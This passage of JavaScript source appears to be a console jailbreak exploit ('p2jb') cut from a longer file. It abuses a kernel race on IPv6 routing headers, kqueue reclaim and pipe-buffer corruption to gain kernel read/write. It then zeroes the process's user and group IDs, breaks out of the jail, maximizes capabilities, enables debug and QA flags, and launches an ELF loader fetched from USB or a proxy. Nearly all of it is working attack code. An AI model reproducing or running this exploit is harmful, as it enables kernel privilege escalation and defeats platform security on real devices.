            let result = null;
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.kread_result_bufs[i], BigInt(size));
                const v = read64_uncompressed(S.kread_result_bufs[i]);
                if (v !== 0x4141414141414141n) {
                    const t = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                    if (t === -1) {
                        wait_uio(S);
                        syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                        S.iov_ws.wait();
                        syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                        S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                        return null;
                    }
                    S.triplets[1] = t;
                    result = S.kread_result_bufs[i];
                }
            }
            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
            if (result === null) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                return null;
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                return null;
            }
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            return result;
        }

        function kwrite_slow(S, kaddr, data_addr, data_size) {
            if (!triplets_valid(S)) return false;
            write32_uncompressed(S.kwrite_sndbuf, BigInt(data_size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kwrite_sndbuf, 4n);
            write64_uncompressed(S.uio_iov_write + 8n, BigInt(data_size));

            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n; let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 1);
                syscall(SYSCALL.sched_yield);
                write32_uncompressed(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
                }
                wait_uio(S);
            }
            if (!found) return false;
            leaked_iov = read64_uncompressed(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return false;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, false, kaddr, BigInt(data_size));
            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32_uncompressed(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!found) return false;

            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[1] = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                if (S.triplets[1] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[1] === -1) return false;

            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) return false;

            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            return true;
        }

        function kslow64(S, kaddr) {
            for (let attempt = 0; attempt < 3; attempt++) {
                if (triplets_valid(S)) {
                    const buf = kread_slow(S, kaddr, 8);
                    if (buf !== null) {
                        const val = read64_uncompressed(buf);
                        if (val !== 0n) {
                            if ((val >> 48n) === 0xFFFFn) return val;
                            if ((val >> 40n) !== 0n) return val;
                        }
                    }
                }
                repair_triplets(S); syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        function stage1(S) {
            send_notification("Stage 1\nKqueue reclaim");
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(2);
            let kq_batch = []; let kq_found = false; let proc_filedesc = 0n;
            for (let k = 0; k < 5000; k++) {
                const kq = syscall(SYSCALL.kqueue);
                if (kq === 0xffffffffffffffffn) {
                    for (const fd of kq_batch) syscall(SYSCALL.close, fd);
                    kq_batch = []; syscall(SYSCALL.sched_yield); continue;
                }
                kq_batch.push(kq);
                write32_uncompressed(S.len_out, 256n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 8n) === 0x1430000n &&
                    read64_uncompressed(S.rthdr_readback + S.OFF.KQ_FDP) !== 0n) {
                    kq_found = true;
                    for (const fd of kq_batch) if (fd !== kq) syscall(SYSCALL.close, fd);
                    proc_filedesc = read64_uncompressed(S.rthdr_readback + S.OFF.KQ_FDP);
                    syscall(SYSCALL.close, kq);
                    break;
                }
                if (kq_batch.length >= 8) {
                    for (const fd of kq_batch) syscall(SYSCALL.close, fd);
                    kq_batch = []; syscall(SYSCALL.sched_yield);
                }
            }
            if (!kq_found) {
                for (const fd of kq_batch) syscall(SYSCALL.close, fd);
                fail("stage1: kqueue reclaim failed");
            }
            if ((proc_filedesc >> 48n) !== 0xFFFFn) fail("stage1: bad filedesc: " + toHex(proc_filedesc));
            S.proc_filedesc = proc_filedesc;
            logger.log("stage1: proc_filedesc=" + toHex(proc_filedesc));

            for (let k = 0; k < 3; k++) {
                S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
                if (S.triplets[1] !== -1) break;
                syscall(SYSCALL.sched_yield); nanosleep_ms(10);
            }
            if (S.triplets[1] === -1) fail("stage1: triplet repair failed");
        }

        function stage2(S) {
            send_notification("Stage 2\nLeak pipe data pointers");
            logger.log("stage2: leaking pipe pointers...");
            for (let attempt = 0; attempt < 5; attempt++) {
                repair_triplets(S); nanosleep_ms(100);
                const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
                if (!fdescenttbl) continue;
                S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

                const master_fp = kslow64(S, S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
                if (!master_fp) continue;
                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

                const victim_fp = kslow64(S, S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
                if (!victim_fp) continue;
                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

                S.master_pipe_data = kslow64(S, master_fp);
                if (!S.master_pipe_data) continue;
                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

                S.victim_pipe_data = kslow64(S, victim_fp);
                if (!S.victim_pipe_data) continue;

                if (S.master_pipe_data !== S.victim_pipe_data) {
                    logger.log("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                        " victim_pipe=" + toHex(S.victim_pipe_data));
                    return;
                }
                nanosleep_ms(500); repair_triplets(S);
            }
            fail("stage2: failed to leak pipe pointers");
        }

        function stage3(S) {
            send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
            logger.log("stage3: corrupting pipe buffer...");

            const pipe_overwrite = malloc(24);
            write32_uncompressed(pipe_overwrite, 0n);
            write32_uncompressed(pipe_overwrite + 4n, 0n);
            write32_uncompressed(pipe_overwrite + 8n, 0n);
            write32_uncompressed(pipe_overwrite + 12n, BigInt(PAGE_SIZE));
            write64_uncompressed(pipe_overwrite + 16n, S.victim_pipe_data);

            nanosleep_ms(100);

            let ok = false;
            for (let attempt = 0; attempt < 40; attempt++) {
                repair_triplets(S);
                if (kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)) { ok = true; break; }
                nanosleep_ms(100); syscall(SYSCALL.sched_yield);
            }
            if (!ok) fail("stage3: kwrite_slow failed after 40 attempts");
            syscall(SYSCALL.sched_yield);

            const pipe_cmd = malloc(24);
            const set_victim_pipe = (cnt, inp, out, size, buf_addr) => {
                write32_uncompressed(pipe_cmd, BigInt(cnt));
                write32_uncompressed(pipe_cmd + 4n, BigInt(inp));
                write32_uncompressed(pipe_cmd + 8n, BigInt(out));
                write32_uncompressed(pipe_cmd + 12n, BigInt(size));
                write64_uncompressed(pipe_cmd + 16n, buf_addr);
                syscall(SYSCALL.write, BigInt(S.master_wfd), pipe_cmd, 24n);
                syscall(SYSCALL.read, BigInt(S.master_rfd), pipe_cmd, 24n);
            };

            S.kread = (buf_addr, kaddr, size) => {
                set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.read, BigInt(S.victim_rfd), buf_addr, BigInt(size));
            };
            S.kwrite = (kaddr, buf_addr, size) => {
                set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.write, BigInt(S.victim_wfd), buf_addr, BigInt(size));
            };
            S.kread32 = (k) => { S.kread(S.scratch_big, k, 4); return read32_uncompressed(S.scratch_big); };
            S.kread64 = (k) => { S.kread(S.scratch_big, k, 8); return read64_uncompressed(S.scratch_big); };
            S.kwrite32 = (k, v) => { write32_uncompressed(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 4); };
            S.kwrite64 = (k, v) => { write64_uncompressed(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 8); };

            let verified = false;
            for (let attempt = 0; attempt < 3; attempt++) {
                if (S.kread64(S.master_pipe_data + 0x10n) === S.victim_pipe_data) {
                    verified = true; break;
                }
                nanosleep_ms(100); repair_triplets(S);
                kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24);
            }
            if (!verified) fail("stage3: verify failed");
            logger.log("stage3: kernel r/w achieved");

            stage3_cleanup(S);
        }

        function stage3_cleanup(S) {
            const get_fp = fd => S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
            const bump = (fp, delta) => {
                const rc = S.kread32(fp + 0x28n);
                if (rc > 0n && rc < 0x10000n) S.kwrite32(fp + 0x28n, Number(rc) + delta);
            };
            const null_rthdr = fd => {
                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                const f_data = S.kread64(fp);
                if (f_data === 0n || (f_data >> 48n) !== 0xFFFFn) return;
                const so_pcb = S.kread64(f_data + 0x18n);
                if (so_pcb === 0n || (so_pcb >> 48n) !== 0xFFFFn) return;
                const pktopts = S.kread64(so_pcb + S.OFF.INPCB_PKTOPTS);
                if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
                S.kwrite64(pktopts + S.OFF.IP6PO_RTHDR, 0n);
            };

            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                const fp = get_fp(fd);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) fail("stage3b: bad fp " + fd);
                bump(fp, 0x100);
            }
            for (const fd of S.ipv6_sockets) null_rthdr(fd);

            for (let i = S.free_fd_idx; i < S.free_fds.length; i++) {
                syscall(SYSCALL.close, BigInt(S.free_fds[i]));
            }
            for (const fd of S.ipv6_sockets) syscall(SYSCALL.close, BigInt(fd));
            syscall(SYSCALL.close, BigInt(S.iov_sock_a));
            syscall(SYSCALL.close, BigInt(S.iov_sock_b));
            syscall(SYSCALL.close, BigInt(S.uio_sock_a));
            syscall(SYSCALL.close, BigInt(S.uio_sock_b));

            S.iov_ws.signal();
            S.uio_read_ws.signal();
            S.uio_write_ws.signal();
            syscall(SYSCALL.sched_yield);
            syscall(SYSCALL.sched_yield);

            for (let i = 0; i < 16; i++) write8_uncompressed(S.cpu_mask + BigInt(i), 0xffn);
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
            write16_uncompressed(S.rt_params, 0n);
            write16_uncompressed(S.rt_params + 2n, 0n);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);

            logger.log("stage3b: race cleanup done");

            nanosleep_ms(3000);
        }

        function force_td_ucred_migrate(S) {

            try {
                const B = S.proc_ucred;
                if (B === 0n || (B >> 48n) !== 0xFFFFn) {
                    logger.log("stage_d6: proc_ucred invalid, skip");
                    return;
                }

                const main_thread = S.kread64(S.curproc + 0x10n);
                if (main_thread === 0n || (main_thread >> 48n) !== 0xFFFFn) {
                    logger.log("stage_d6: p_threads empty, skip");
                    return;
                }

                const bp = S.kread64(main_thread + 0x08n);
                if (bp !== S.curproc) {
                    logger.log("stage_d6: td_proc backptr mismatch (" + toHex(bp) +
                        " vs " + toHex(S.curproc) + "), skip");
                    return;
                }

                const next_thread = S.kread64(main_thread + 0x10n);
                if (next_thread === 0n || (next_thread >> 48n) !== 0xFFFFn ||
                    next_thread === main_thread) {
                    logger.log("stage_d6: no 2nd thread for cross-validation, skip");
                    return;
                }
                const candidates = [];
                for (let off = 0x100n; off <= 0x200n; off += 8n) {
                    const v_main = S.kread64(main_thread + off);
                    if (v_main !== B) continue;
                    const v_next = S.kread64(next_thread + off);
                    if (v_next === 0n || (v_next >> 48n) !== 0xFFFFn) continue;
                    if (v_next === B) continue;
                    candidates.push(off);
                }
                if (candidates.length === 0) {
                    logger.log("stage_d6: td_ucred offset not found, skip");
                    return;
                }
                if (candidates.length > 1) {
                    logger.log("stage_d6: td_ucred offset ambiguous (" +
                        candidates.length + " candidates), skip");
                    return;
                }
                const td_ucred_off = candidates[0];
                logger.log("stage_d6: td_ucred at +" + toHex(td_ucred_off) +
                    " (1 cand, validated)");

                let td = main_thread;
                let patched = 0;
                let walked = 0;
                while (td !== 0n && (td >> 48n) === 0xFFFFn && walked < 500) {
                    walked++;

                    if (S.kread64(td + 0x08n) !== S.curproc) {
                        logger.log("stage_d6: td_proc mismatch at thread " +
                            toHex(td) + ", abort walk");
                        break;
                    }
                    const cur = S.kread64(td + td_ucred_off);
                    if (cur !== B) {
                        S.kwrite64(td + td_ucred_off, B);
                        patched++;
                    }
                    td = S.kread64(td + 0x10n);
                }
                logger.log("stage_d6: walked " + walked + " threads, patched " +
                    patched + " stale td_ucred");

                if (patched > 0) {

                    const old_ref = S.kread32(B);
                    const new_ref = old_ref + BigInt(patched);
                    S.kwrite32(B, new_ref);
                    logger.log("stage_d6: cr_ref(B) " + toHex(old_ref) +
                        " -> " + toHex(new_ref) + " (+" + patched + ")");
                }
            } catch (e) {
                try { logger.log("stage_d6: exception: " + e.message + " - skipped"); }
                catch (_) { }
            }
        }

        function stage4(S) {
            send_notification("Stage 4\nFind curproc + rootvnode");

            const [sr, sw] = create_pipe();
            const sigio_rfd = Number(sr), sigio_wfd = Number(sw);
            const our_pid = syscall(SYSCALL.getpid) & 0xFFFFFFFFn;
            const pid_buf = malloc(4);
            write32_uncompressed(pid_buf, our_pid);
            syscall(SYSCALL.ioctl, BigInt(sigio_rfd), 0x8004667Cn, pid_buf);

            const sigio_fp = S.kread64(S.fd_ofiles + BigInt(sigio_rfd) * S.OFF.FILEDESCENT_SIZE);
            if (sigio_fp === 0n || (sigio_fp >> 48n) !== 0xFFFFn) fail("stage4: bad sigio fp");
            const sigio_pipe = S.kread64(sigio_fp);
            if (sigio_pipe === 0n || (sigio_pipe >> 48n) !== 0xFFFFn) fail("stage4: bad sigio pipe");
            const pipe_sigio = S.kread64(sigio_pipe + S.OFF.PIPE_SIGIO);
            if (pipe_sigio === 0n || (pipe_sigio >> 48n) !== 0xFFFFn) fail("stage4: no sigio");
            const curproc = S.kread64(pipe_sigio);
            if (curproc === 0n || (curproc >> 48n) !== 0xFFFFn) fail("stage4: bad curproc");
            if (S.kread32(curproc + S.OFF.PROC_PID) !== our_pid) fail("stage4: pid mismatch");

            syscall(SYSCALL.close, BigInt(sigio_rfd));
            syscall(SYSCALL.close, BigInt(sigio_wfd));

            S.curproc = curproc;
            S.proc_ucred = S.kread64(curproc + S.OFF.PROC_UCRED);
            S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
            logger.log("stage4: curproc=" + toHex(curproc) + " fd=" + toHex(S.proc_fd));

            force_td_ucred_migrate(S);

            const walk = (start, link_off) => {
                let p = start;
                for (let i = 0; i < 500; i++) {
                    if (p === 0n || (p >> 48n) !== 0xFFFFn) return null;
                    if (S.kread32(p + S.OFF.PROC_PID) === 1n) return p;
                    p = S.kread64(p + link_off);
                }
                return null;
            };
            let init_proc = walk(curproc, 0n) || walk(S.kread64(curproc + 8n), 8n);
            let rootvnode = null;
            if (init_proc) {
                const init_fd = S.kread64(init_proc + S.OFF.PROC_FD);
                if (init_fd !== 0n && (init_fd >> 48n) === 0xFFFFn) {
                    rootvnode = S.kread64(init_fd + S.OFF.FD_RDIR);
                }
            }
            if (!rootvnode || rootvnode === 0n || (rootvnode >> 48n) !== 0xFFFFn) {
                fail("stage4: rootvnode not found");
            }
            S.rootvnode = rootvnode;
            logger.log("stage4: rootvnode=" + toHex(rootvnode));
        }

        function stage5(S) {
            send_notification("Stage 5\nJailbreak");

            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_UID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_NGROUPS, 1);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RGID, 0);

            let attrs = S.kread64(S.proc_ucred + 0x80n);
            attrs = (attrs & 0xFFFFFFFF00FFFFFFn) | (0x80n << 24n);
            S.kwrite64(S.proc_ucred + 0x80n, attrs);

            S.kwrite64(S.proc_fd + S.OFF.FD_RDIR, S.rootvnode);
            S.kwrite64(S.proc_fd + S.OFF.FD_JDIR, S.rootvnode);

            if (S.kread32(S.proc_ucred + S.OFF.UCRED_CR_UID) !== 0n) {
                fail("stage5: jailbreak verify failed");
            }
            logger.log("stage5: jailbreak ok");
        }

        function stage6(S) {
            send_notification("Stage 6\nData_base + Debug menu");

            const KDATA_MASK = 0xffff804000000000n;
            let p = S.curproc, allproc = 0n;
            for (let i = 0; i < 64; i++) {
                if (p !== 0n && (p & KDATA_MASK) === KDATA_MASK &&
                    ((p - S.OFF.DATA_BASE_ALLPROC) & 0xfffn) === 0n) {
                    allproc = p; break;
                }
                p = S.kread64(p + 8n);
            }
            if (allproc === 0n) {
                S.data_base_ok = false;
                logger.log("stage6: allproc not found - debug menu + elf " +
                    "loader skipped (jailbreak is done)");
                return;
            }
            const data_base = allproc - S.OFF.DATA_BASE_ALLPROC;
            S.data_base = data_base;
            logger.log("stage6: allproc=" + toHex(allproc) +
                " data_base=" + toHex(data_base));

            let data_base_ok = true;
            const first_proc = S.kread64(allproc);
            const first_proc_ok = (first_proc >> 48n) === 0xFFFFn;
            logger.log("stage6: data_base check - *allproc=" + toHex(first_proc) +
                (first_proc_ok ? "  (kptr OK)" : "  (BAD - not a kptr)"));
            if (!first_proc_ok) data_base_ok = false;
            if (S.OFF.DATA_BASE_ROOTVNODE) {
                const rv_off = S.kread64(data_base + S.OFF.DATA_BASE_ROOTVNODE);
                const rv_ok = (rv_off === S.rootvnode);
                logger.log("stage6: data_base check - rootvnode via offset=" +
                    toHex(rv_off) + " vs stage4 found=" + toHex(S.rootvnode) +
                    (rv_ok ? "  => data_base CORRECT"
                        : "  => MISMATCH - data_base / 11.60 offsets are WRONG"));
                if (!rv_ok) data_base_ok = false;
            }

            if (typeof is_jailbroken === "function")
                logger.log("stage6: is_jailbroken() = " + is_jailbroken());
            S.data_base_ok = data_base_ok;
            if (!data_base_ok) {
                logger.log("stage6: data_base check FAILED - skipping the debug " +
                    "menu and the elf loader. The jailbreak is complete.");
                return;
            }

            if (ENABLE_DEBUG_MENU) {
                stage_debug_menu(S);
            } else {
                logger.log("stage6: debug menu DISABLED (ENABLE_DEBUG_MENU=false)");
            }
        }

        function stage_debug_menu(S) {
            try {
                if (typeof gpu === "undefined" || typeof kernel === "undefined" ||
                    typeof update_kernel_offsets !== "function") {
                    logger.log("stage_debug: framework gpu/kernel/update_kernel_offsets " +
                        "not in scope - skipped");
                    return;
                }
                if (!S.data_base || !S.curproc) {
                    logger.log("stage_debug: data_base/curproc missing - skipped");
                    return;
                }

                kernel.read_buffer = (kaddr, size) => {
                    S.kread(S.scratch_big, BigInt(kaddr), Number(size));
                    return read_buffer(S.scratch_big, Number(size));
                };
                kernel.write_buffer = (kaddr, buf) => {
                    write_buffer(S.scratch_big, buf);
                    S.kwrite(BigInt(kaddr), S.scratch_big, buf.length);
                };

                kernel.addr.curproc = S.curproc;
                kernel.addr.data_base = S.data_base;
                const pmap_store = S.data_base + S.OFF.DATA_BASE_KERNEL_PMAP_STORE;
                const pml4 = S.kread64(pmap_store + S.OFF.PMAP_PML4);
                const cr3 = S.kread64(pmap_store + S.OFF.PMAP_CR3);
                kernel.addr.kernel_cr3 = cr3;
                kernel.addr.dmap_base = pml4 - cr3;
                logger.log("stage_debug: cr3=" + toHex(cr3) +
                    " dmap_base=" + toHex(kernel.addr.dmap_base));

                if (kernel_offset.SIZEOF_GVMSPACE === undefined) kernel_offset.SIZEOF_GVMSPACE = 0x100n;
                if (kernel_offset.GVMSPACE_START_VA === undefined) kernel_offset.GVMSPACE_START_VA = 0x08n;
                if (kernel_offset.GVMSPACE_SIZE === undefined) kernel_offset.GVMSPACE_SIZE = 0x10n;
                if (kernel_offset.GVMSPACE_PAGE_DIR_VA === undefined) kernel_offset.GVMSPACE_PAGE_DIR_VA = 0x38n;

                update_kernel_offsets();
                logger.log("stage_debug: VMSPACE_VM_PMAP=" +
                    toHex(kernel_offset.VMSPACE_VM_PMAP) + " VM_VMID=" +
                    toHex(kernel_offset.VMSPACE_VM_VMID));

                gpu.setup();
                logger.log("stage_debug: gpu.setup() ok");

                const security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS;
                const target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID;
                const qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS;
                const utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS;

                logger.log("stage_debug: setting security flags");
                const security_flags = kernel.read_dword(security_flags_addr);
                logger.log("  before: " + toHex(security_flags));
                gpu.write_dword(security_flags_addr, security_flags | 0x14n);
                const security_flags_after = kernel.read_dword(security_flags_addr);
                logger.log("  after:  " + toHex(security_flags_after));

                logger.log("stage_debug: setting targetid");
                const target_id_before = kernel.read_byte(target_id_flags_addr);
                logger.log("  before: " + toHex(target_id_before));
                gpu.write_byte(target_id_flags_addr, 0x82n);
                const target_id_after = kernel.read_byte(target_id_flags_addr);
                logger.log("  after:  " + toHex(target_id_after));

                logger.log("stage_debug: setting qa flags and utoken flags");
                const qa_flags = kernel.read_dword(qa_flags_addr);
                logger.log("  qa_flags before: " + toHex(qa_flags));
                gpu.write_dword(qa_flags_addr, qa_flags | 0x10300n);
                const qa_flags_after = kernel.read_dword(qa_flags_addr);
                logger.log("  qa_flags after:  " + toHex(qa_flags_after));

                const utoken_flags = kernel.read_byte(utoken_flags_addr);
                logger.log("  utoken_flags before: " + toHex(utoken_flags));
                gpu.write_byte(utoken_flags_addr, utoken_flags | 0x1n);
                const utoken_flags_after = kernel.read_byte(utoken_flags_addr);
                logger.log("  utoken_flags after:  " + toHex(utoken_flags_after));

                logger.log("stage_debug: debug menu enabled");
            } catch (e) {
                logger.log("stage_debug: failed: " + e.message +
                    " (jailbreak unaffected)");
            }
        }

        function stage7(S) {
            send_notification("Stage 7\nFinalize: authid + caps");

            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, SYSTEM_AUTHID);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);

            logger.log("stage7: jailbreak complete; authid+caps maximized");
            send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");

            logger.log("stage7: 'Jailbroken' notification sent -> stage_load_elf");

        }

        function stage_load_elf(S) {

            logger.log("stage_elfldr: entered");
            if (!LAUNCH_ELF_LOADER) {
                logger.log("stage_elfldr: LAUNCH_ELF_LOADER=false - skipped");
                return;
            }
            if (!S.data_base_ok) {
                logger.log("stage_elfldr: kernel data_base not resolved/verified " +
                    "in stage6 - elf loader skipped");
                send_notification("Stage 7\nelf loader skipped (no data_base)");
                return;
            }
            try {
                if (typeof elf_parse !== "function" || typeof elf_run !== "function" ||
                    typeof elf_wait_for_exit !== "function" ||
                    typeof ipv6_kernel_rw === "undefined") {
                    logger.log("stage_elfldr: framework elf_parse/elf_run/" +
                        "elf_wait_for_exit/ipv6_kernel_rw not in scope - skipped");
                    send_notification("Stage 7\nelf loader unavailable - skipped");
                    return;
                }

                logger.log("stage_elfldr: scanning /mnt/usb0..7 for elfldr...");
                const usb_names = ["elfldr_1320.elf", "elfldr.elf"];
                let elf_path = null;
                for (let u = 0; u < 8 && !elf_path; u++) {
                    for (const name of usb_names) {
                        const p = "/mnt/usb" + u + "/" + name;
                        if (file_exists(p)) { elf_path = p; break; }
                    }
                }
                if (!elf_path && typeof fetch_file === "function") {
                    logger.log("stage_elfldr: USB not found - fetching elfldr.elf from proxy...");
                } else if (!elf_path) {
                    logger.log("stage_elfldr: elfldr not found on /mnt/usb0../usb7");
                    send_notification("Stage 7\nelfldr_1320.elf NOT FOUND on USB\n" +
                        "(plug a FAT32/exFAT USB with elfldr_1320.elf)");
                    return;
                } else {
                    logger.log("stage_elfldr: found " + elf_path);
                }

                ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
                kernel.addr.data_base = S.data_base;
                logger.log("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
                    ipv6_kernel_rw.data.master_sock + " victim_sock=" +
                    ipv6_kernel_rw.data.victim_sock + ")");

                const pin_sock = (fd) => {
                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                    const so = S.kread64(fp);
                    if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
                    S.kwrite32(so, 0x100);
                };
                pin_sock(ipv6_kernel_rw.data.master_sock);
                pin_sock(ipv6_kernel_rw.data.victim_sock);

                const pin_pipe_fd = (fd) => {
                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                    const rc = S.kread32(fp + 0x28n);
                    if (rc > 0n && rc < 0x10000n)
                        S.kwrite32(fp + 0x28n, Number(rc) + 0x100);
                };
                pin_pipe_fd(ipv6_kernel_rw.data.pipe_read_fd);
                pin_pipe_fd(ipv6_kernel_rw.data.pipe_write_fd);
                logger.log("stage_elfldr: handoff pipe + sockets pinned");

                let elf_data;
                if (elf_path) {
                    elf_data = read_file(elf_path);
                    logger.log("stage_elfldr: read " + elf_data.length + " bytes from USB; parsing...");
                } else {
                    const proxy_buf = malloc(400 * 1024);
                    const proxy_size = fetch_file("elfldr.elf", proxy_buf);
                    if (!proxy_size || proxy_size < 1000) {
                        logger.log("stage_elfldr: proxy fetch failed (got " + proxy_size + " bytes)");
                        send_notification("Stage 7\nelfldr proxy fetch failed");
                        return;
                    }
                    logger.log("stage_elfldr: fetched " + proxy_size + " bytes from proxy; parsing...");
                    elf_data = proxy_buf;
                }
                const entry = elf_parse(elf_data);
                logger.log("stage_elfldr: elf entry=" + toHex(entry) +
                    "; spawning elfldr...");
                const { thr_handle, payloadout } = elf_run(entry, elf_path);

                logger.log("stage_elfldr: elfldr spawned - joining...");
                elf_wait_for_exit(thr_handle, payloadout);
                const out = read32_uncompressed(payloadout);
                logger.log("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
                logger.log("stage_elfldr: daemon should be listening on :9021");
                send_notification("Stage 7\nelfldr running - send your ELF to\n" +
                    "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
            } catch (e) {
                logger.log("stage_elfldr: failed: " + e.message);
                send_notification("Stage 7\nelfldr failed: " + e.message +
                    "\n(jailbreak still complete)");
            }
        }

        send_notification(p2jb_version);

        try {
            if (typeof is_jailbroken === "function" && is_jailbroken()) {
                send_notification("p2jb: already jailbroken");
                return;
            }
